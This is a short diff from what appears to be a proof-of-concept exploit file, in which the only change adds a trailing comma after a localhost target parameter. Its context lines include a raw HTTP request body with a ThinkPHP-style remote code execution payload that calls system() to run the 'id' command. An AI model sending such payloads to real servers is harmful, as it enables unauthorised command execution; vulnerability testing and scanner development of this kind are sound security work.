@@ -112,7 +112,7 @@ Content-Length: 72
 
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 `, poc.params({
-    "target": "localhost:8080"
+    "target": "localhost:8080",
 }))
 die(err)
 
